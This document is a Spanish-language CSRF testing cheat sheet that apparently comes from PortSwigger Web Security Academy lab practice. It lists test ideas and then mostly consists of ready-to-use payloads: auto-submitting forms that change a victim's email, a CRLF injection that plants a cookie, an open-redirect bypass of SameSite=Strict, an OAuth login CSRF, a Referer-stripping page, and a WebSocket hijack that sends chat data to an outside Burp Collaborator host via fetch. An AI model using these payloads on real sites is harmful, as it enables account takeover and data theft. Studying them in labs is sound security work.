--  -
## **Cosas a testear**
1. Ver si borrando el csrf token se puede de igual manera modificar los campos CRUD.
2. Cambiar el metodo utilizado y agregar un **`&_method=POST`** para ver de engañar al servidor y sobreescribir el metodo.
3. Probar reutilizando el token de otro usuario sin haber sido utilizado previamente.
4. Intentar eliminando la cabecera referer **`<meta name="referrer" content="no-referrer">`** o modificarla para que sea considerada como valida **`Referrer-Policy: unsafe-url`**.

--- -
## **Payloads**
- Intentamos cargar una imagen la cual intenta hacer un search para así setear como cookie un csrfkey valido y la cookie Samesite=None para que no joda con el tema de los dominios cruzados. La carga de esa imagen va a generar un error, por lo que en ese error subimos el form con todo ya seteado previamente.
```html
<form action="https://URL/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="kike@kike.com" />
    <input type="hidden" name="csrf" value="YuqS3GNMMQ4pMjgJueYf1S5GdHgGV4E3" />
    <input type="submit" value="Submit request" />
</form>

<img src="https://URL/?search=test%0d%0aSet-Cookie:%20csrfKey=BfSlrsokL2VXRM9P5dfS58XmlkZG9Hzp%3b%20Samesite=None%3b%20Secure" onerror="document.forms[0].submit();">
```

- Aprovechando de un open-redirect para bypassear la restriccion Samesite=Strict
```html
<script>
    location="https://URL/post/comment/confirmation?postId=../my-account/change-email%3femail=juansero@kike.com%26submit=1";
</script>
```

- Exfiltracion de datos mediante el uso de websockets
```javascript
<script>
	var ws = new WebSocket("https://URL/chat");
	
	ws.onopen = function() {
	    ws.send("READY");
	};
	
	ws.onmessage = function(info) {
		    fetch("https://BURP-COLLABORATOR/?data=" + btoa(info.data));
	};
</script>
```

- Explotando CSRF en Oauth arrastrando cookies una vez realizando la solicitud al endpoint correspondiente para que nos las asigne.
```html
<form action="https://0ac900850465cb0e857b7763005c00bf.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="kike@kike.com" />
  <input type="submit" value="Submit request" />
</form>


<script>
  window.open("https://0ac900850465cb0e857b7763005c00bf.web-security-academy.net/social-login");
  setTimeout(updateEmail,5000);
  function updateEmail(){
      document.forms[0].submit();
  }
</script>


```

- Eliminando cabecera Referrer
```html
<html>
<head>
    <meta name="referrer" content="no-referrer">
</head>
<form class="login-form" name="change-email-form" action="https://URL/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@pwned.com">
</form>

<script>
    document.forms[0].submit();
</script>
</html>

```